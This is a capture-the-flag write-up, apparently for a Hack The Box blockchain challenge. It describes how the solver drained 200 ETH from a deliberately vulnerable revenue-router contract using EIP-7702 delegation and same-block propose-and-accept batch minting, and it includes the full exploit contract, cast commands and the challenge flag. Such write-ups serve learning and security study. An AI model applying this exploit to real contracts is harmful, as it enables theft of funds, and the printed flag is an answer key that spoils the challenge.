# The Contribution That Undid The Harbor

**Category:** Blockchain
**Difficulty:** Medium
**Challenge ID:** 63354
**Points:** 1000
**Solves:** 5 (at time of solve)
**Status:** ✅ **SOLVED**
**Date:** 2025-11-20 to 2025-11-22
**Total Time:** ~2 days (with context window recovery)

---

## TL;DR

✅ **Challenge SOLVED!**
🔑 **Key Insight:** Helper contract needed `receive()` function to accept ETH when delegated via EIP-7702
🎯 **Previous Blocker Was Wrong:** RPC DID support EIP-7702 - the real issue was missing receive function!

**Flag:** `HTB{sp3c14l_30a_pr0p053_f4llb4ck_4cc3p7_m1n7_buy0u7_81d2750af6f8b39068febfc03457cdb8}`

---

## Challenge Description

In Kasumihama's tide-slick docks, the port owner sold "fairness" as a lacquered token called Contribution—an NFT sigil minted only when a proposal pleased him. Satoshi exploited the revenue distribution system by creating multiple contribution tokens through same-block proposal acceptance combined with EIP-7702 delegation.

**Victory Condition:**
- Drain 200 ETH from RevenueRouter contract
- Player wallet >= 200 ETH

---

## The Vulnerabilities

### 1. onlyEOA Modifier with Impossible Requirement

**File:** `Adapter.sol:19-26`

```solidity
modifier onlyEOA() {
    if (IRouterOwner(address(this)).owner() == msg.sender){
        _;
    } else {
        require(msg.sender == tx.origin && msg.sender.code.length > 0, "Only_Owner_EOA");
        _;
    }
}
```

Requires caller to be BOTH:
1. An EOA (`msg.sender == tx.origin`)
2. Have contract code (`code.length > 0`)

**Solution:** EIP-7702 (Set Code Transaction) - allows EOAs to delegate code execution

### 2. Same-Block Proposal Acceptance

**File:** `ProposalRegistry.sol:21-30`

```solidity
function propose(...) external onlyRouter returns (uint256 pid) {
    mustAcceptInBlock[pid] = block.number;  // Expires immediately!
}

function accept(uint256 pid) external onlyRouter {
    require(mustAcceptInBlock[pid] == block.number, "EXPIRED");
}
```

Proposals must be accepted in the SAME block they're created.

**Solution:** Deploy Helper contract that batches propose + accept in single transaction

### 3. Missing Receive Function (Critical!)

When an EOA is delegated via EIP-7702, ETH transfers to that EOA execute in the delegated contract's context!

**File:** `RevenueRouter.sol:46-53`

```solidity
function claimByToken(uint256 tokenId) external onlyRouter nonReentrant {
    ...
    address payable to = payable(contributionNFT.ownerOf(tokenId));
    (bool ok,) = to.call{value: amt}("");  // Fails if delegated contract can't receive ETH!
    require(ok, "xfer");
}
```

**Solution:** Add `receive() external payable {}` to Helper contract

---

## Complete Solution

### Step 1: Helper Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IRouter {
    function propose(uint256 portId, uint16 impactBps, string calldata uri) external returns (uint256);
    function acceptAndMint(uint256 proposalId) external;
}

contract Helper {
    function batchMint(address router, uint256 portId, uint16 impactBps, uint256 count) external {
        IRouter r = IRouter(router);
        for (uint256 i = 0; i < count; i++) {
            uint256 pid = r.propose(portId, impactBps, string(abi.encodePacked("ipfs://batch-", i)));
            r.acceptAndMint(pid);  // Same transaction!
        }
    }

    // CRITICAL: Must have receive to accept ETH when delegated via EIP-7702!
    receive() external payable {}
    fallback() external payable {}
}
```

### Step 2: Exploit Flow

1. Deploy Helper contract
2. Register player
3. Apply EIP-7702 delegation: `cast send $PLAYER --auth $HELPER --private-key $PRIVKEY --rpc-url $RPC`
4. Verify delegation: `cast code $PLAYER` should return `0xef0100<helper_address>`
5. Batch mint 18 tokens: Call `batchMint(router, 1, 10000, 18)` on PLAYER (delegated to Helper)
6. Run market: Distributes 100 ETH to token #19
7. Claim token 19: ~5.5 ETH
8. Buyout tokens 2-19: 18 × 10 ETH = 180 ETH
9. **Total: ~202 ETH collected!**

**See [FINAL_EXPLOIT.sh](FINAL_EXPLOIT.sh) for complete working script.**

---

## Key Technical Insights

### EIP-7702 Mechanics (CRITICAL LEARNING)

**What We Thought Was Wrong (Nov 20-21):**
- RPC doesn't support EIP-7702
- Delegation not being applied

**What Was Actually Wrong:**
- RPC DID support EIP-7702!
- Delegation WAS being applied!
- The issue was Helper contract lacked `receive()` function!

**How We Discovered This:**
1. EIP-7702 delegation transaction showed `status: 0 (failed)`
2. But when we checked `cast code $PLAYER`, it showed `0xef0100<address>`!
3. Delegation WAS working despite status 0!
4. The "xfer" error was from ETH transfer, not delegation!

**Lesson:** Status codes can be misleading - always verify state changes independently!

### Foundry vs Python for EIP-7702

- **Foundry's cast:** ✅ Proper EIP-7702 support
- **Python web3.py:** ❌ Did not work with this RPC

```bash
# Correct way with Foundry
cast send $PLAYER --value 0 --auth $HELPER --private-key $PRIVKEY --rpc-url $RPC
```

---

## Blockers Overcome

1. **"RPC doesn't support EIP-7702"** → FALSE! It did, just showed misleading status
2. **Proposals expiring** → Fixed with Helper contract for same-block batching
3. **ETH transfer failing ("xfer")** → Fixed by adding `receive()` to Helper
4. **Line ending issues** → Fixed with `sed -i 's/\r$//'`

---

## Files in This Folder

- **Helper.sol** - Final working contract with batch minting + receive function
- **FINAL_EXPLOIT.sh** - Complete working exploit script
- **WRITEUP.md** - Detailed technical writeup
- **BLOCKERS.md** - Documentation of all blockers encountered
- **The Contribution That Undid The Harbor/** - Original challenge source code

---

## Flag

```
HTB{sp3c14l_30a_pr0p053_f4llb4ck_4cc3p7_m1n7_buy0u7_81d2750af6f8b39068febfc03457cdb8}
```

---

## Tools Used

- **Foundry (forge & cast)** - Solidity development and EIP-7702 transactions
- **curl** - API interactions
- **HTB MCP** - Challenge management and flag submission

---

## Related Challenges

- "The Debt That Hunts The Poor" (Easy) - Similar blockchain exploitation pattern

---

## Timeline

- **Nov 20**: Initial analysis, identified EIP-7702 as solution
- **Nov 21**: Believed RPC didn't support EIP-7702 (incorrect diagnosis!)
- **Nov 22**: Discovered delegation WAS working, added `receive()` function
- **Nov 22**: **SOLVED!** 🎉

---

**See [WRITEUP.md](WRITEUP.md) for complete technical details and vulnerability analysis.**
